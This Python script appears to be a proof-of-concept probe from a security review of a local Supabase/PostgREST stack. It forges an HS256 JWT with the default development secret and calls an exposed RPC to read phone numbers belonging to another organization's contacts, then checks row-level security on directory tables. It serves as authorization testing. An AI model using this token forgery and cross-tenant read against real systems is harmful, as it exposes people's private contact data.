#!/usr/bin/env python3
"""probe106 — W1b final review r5, BLOCKING-1 over the public API.

identity_phone_numbers() is granted EXECUTE to `authenticated` and lives in
`public`, so PostgREST exposes it at /rest/v1/rpc/identity_phone_numbers. This
mints a local HS256 JWT for cf100000-...-0001 (owner of Phase One Synthetic
Studio, and of nothing else) and asks for a Local Dev Studio rolodex card's
numbers, naming its OWN org id as p_organization_id. Local stack only.
"""
import base64, hmac, hashlib, json, time, urllib.request, urllib.error

SECRET = b"super-secret-jwt-token-with-at-least-32-characters-long"
def b64(x): return base64.urlsafe_b64encode(x).rstrip(b"=")

now = int(time.time())
hdr = b64(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
pl  = b64(json.dumps({"sub": "cf100000-0000-4000-8000-000000000001",
                      "role": "authenticated", "aud": "authenticated",
                      "iat": now, "exp": now + 3600}).encode())
tok = (hdr + b"." + pl + b"." +
       b64(hmac.new(SECRET, hdr + b"." + pl, hashlib.sha256).digest())).decode()

for label, key in [("a FOREIGN rolodex card (Adaeze Okonkwo)", "d0e10000-0000-0000-0000-000000000004"),
                   ("a FOREIGN rolodex card (Amara Osei)",     "d0e10000-0000-0000-0000-000000000016")]:
    body = json.dumps({"p_organization_id": "cf120000-0000-4000-8000-000000000001",
                       "p_identity_key": key, "p_card_phone_e164": None}).encode()
    req = urllib.request.Request(
        "http://127.0.0.1:54321/rest/v1/rpc/identity_phone_numbers", data=body,
        headers={"apikey": tok, "Authorization": "Bearer " + tok,
                 "Content-Type": "application/json"})
    try:
        print(f"{label:45s} -> HTTP 200 {urllib.request.urlopen(req).read().decode()}")
    except urllib.error.HTTPError as e:
        print(f"{label:45s} -> HTTP {e.code} {e.read().decode()[:200]}")

# control: the same caller reading the victim studio's directory through RLS
for rel in ("people_directory", "people_directory_seats", "project_site_access_cards"):
    req = urllib.request.Request(
        f"http://127.0.0.1:54321/rest/v1/{rel}?select=*&limit=1",
        headers={"apikey": tok, "Authorization": "Bearer " + tok})
    try:
        print(f"GET {rel:28s} -> HTTP 200 {urllib.request.urlopen(req).read().decode()[:60]}")
    except urllib.error.HTTPError as e:
        print(f"GET {rel:28s} -> HTTP {e.code} {e.read().decode()[:120]}")
